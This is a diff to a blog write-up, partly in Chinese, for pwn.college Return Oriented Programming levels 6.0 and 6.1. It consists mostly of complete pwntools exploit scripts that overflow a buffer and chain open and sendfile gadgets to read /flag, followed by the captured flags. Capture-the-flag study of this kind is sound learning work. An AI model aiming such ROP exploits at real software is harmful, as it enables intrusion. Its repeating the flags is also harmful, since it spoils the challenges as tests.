@@ -1,7 +1,7 @@
 ---
 title: "Write-ups: Program Security (Return Oriented Programming) series"
 pubDate: "2025-01-19 13:34"
-modDate: "2025-01-20 15:44"
+modDate: "2025-01-20 17:00"
 categories:
   - "Pwn"
   - "Write-ups"
@@ -1451,3 +1451,303 @@ if __name__ == "__main__":
 ### Flag
 
 Flag: `pwn.college{Uer5U7c794jENBtWtFCgDEyLRsm.0FM1MDL5cTNxgzW}`
+
+## Level 6.0
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Craft a ROP chain to obtain the flag, now with no syscall gadget!
+
+### Write-up
+
+没有 `syscall` gadget 了，但是瞧瞧我发现了什么？
+
+```c
+ssize_t __fastcall force_import(const char *a1, int a2)
+{
+  off_t *v2; // rdx
+  size_t v3; // rcx
+
+  open(a1, a2);
+  return sendfile((int)a1, a2, v2, v3);
+}
+```
+
+一次传参直接调用 `force_import` 肯定是不太方便的，但是既然内部有 `open` 和 `sendfile`，那为何不分别调用它们呢？easy peasy!
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    os,
+    p64,
+    process,
+    remote,
+)
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level6.0"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+b *challenge+288
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload():
+    rop = ROP(elf)
+
+    padding_to_ret = b"".ljust(0x58, b"A")
+
+    open = elf.symbols["open"]
+    sendfile = elf.symbols["sendfile"]
+
+    # args for open
+    filename = next(elf.search(b"GNU"))
+    flags = 0x0
+
+    # args for sendfile
+    out_fd = 0x1
+    in_fd = 0x3
+    offset = 0x0
+    count = 0x1000
+
+    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
+    pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"]).address
+    pop_rdx_ret = rop.find_gadget(["pop rdx", "ret"]).address
+    pop_rcx_ret = rop.find_gadget(["pop rcx", "ret"]).address
+
+    payload = padding_to_ret
+    payload += flat(
+        p64(pop_rdi_ret),
+        p64(filename),
+        p64(pop_rsi_ret),
+        p64(flags),
+        p64(open),
+        p64(pop_rdi_ret),
+        p64(out_fd),
+        p64(pop_rsi_ret),
+        p64(in_fd),
+        p64(pop_rdx_ret),
+        p64(offset),
+        p64(pop_rcx_ret),
+        p64(count),
+        p64(sendfile),
+    )
+
+    return payload
+
+
+def attack(target, payload):
+    try:
+        os.system("ln -s /flag GNU")
+
+        send_payload(target, payload)
+
+        response = target.recvall(timeout=3)
+
+        if b"pwn.college{" in response:
+            return True
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch(debug=False)
+        payload = construct_payload()
+
+        if attack(target, payload):
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{0u8eS8EM1OTTXbPHdwgRj2FQ4m0.0VM1MDL5cTNxgzW}`
+
+## Level 6.1
+
+### Information
+
+- Category: Pwn
+
+### Description
+
+> Craft a ROP chain to obtain the flag, now with no syscall gadget!
+
+### Write-up
+
+参见 [Level 6.0](#level-60)。
+
+### Exploit
+
+```python
+#!/usr/bin/python3
+
+from pwn import (
+    ELF,
+    ROP,
+    context,
+    flat,
+    gdb,
+    log,
+    os,
+    p64,
+    process,
+    remote,
+)
+
+context(log_level="debug", terminal="kitty")
+
+FILE = "./babyrop_level6.1"
+HOST, PORT = "localhost", 1337
+
+gdbscript = """
+c
+"""
+
+
+def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
+    if local:
+        global elf
+
+        elf = ELF(FILE)
+        context.binary = elf
+
+        if debug:
+            return gdb.debug(
+                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
+            )
+        else:
+            return process([elf.path] + (argv or []), env=envp)
+    else:
+        return remote(HOST, PORT)
+
+
+def send_payload(target, payload):
+    try:
+        target.send(payload)
+    except Exception as e:
+        log.exception(f"An error occurred while sending payload: {e}")
+
+
+def construct_payload():
+    rop = ROP(elf)
+
+    padding_to_ret = b"".ljust(0x28, b"A")
+
+    open = elf.symbols["open"]
+    sendfile = elf.symbols["sendfile"]
+
+    # args for open
+    filename = next(elf.search(b"GNU"))
+    flags = 0x0
+
+    # args for sendfile
+    out_fd = 0x1
+    in_fd = 0x3
+    offset = 0x0
+    count = 0x1000
+
+    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
+    pop_rsi_ret = rop.find_gadget(["pop rsi", "ret"]).address
+    pop_rdx_ret = rop.find_gadget(["pop rdx", "ret"]).address
+    pop_rcx_ret = rop.find_gadget(["pop rcx", "ret"]).address
+
+    payload = padding_to_ret
+    payload += flat(
+        p64(pop_rdi_ret),
+        p64(filename),
+        p64(pop_rsi_ret),
+        p64(flags),
+        p64(open),
+        p64(pop_rdi_ret),
+        p64(out_fd),
+        p64(pop_rsi_ret),
+        p64(in_fd),
+        p64(pop_rdx_ret),
+        p64(offset),
+        p64(pop_rcx_ret),
+        p64(count),
+        p64(sendfile),
+    )
+
+    return payload
+
+
+def attack(target, payload):
+    try:
+        os.system("ln -s /flag GNU")
+
+        send_payload(target, payload)
+
+        response = target.recvall(timeout=3)
+
+        if b"pwn.college{" in response:
+            return True
+    except Exception as e:
+        log.exception(f"An error occurred while performing attack: {e}")
+
+
+def main():
+    try:
+        target = launch(debug=False)
+        payload = construct_payload()
+
+        if attack(target, payload):
+            exit()
+    except Exception as e:
+        log.exception(f"An error occurred in main: {e}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Flag
+
+Flag: `pwn.college{A-DtWrNucuvlqiQOl-yB1ARFcxt.0lM1MDL5cTNxgzW}`
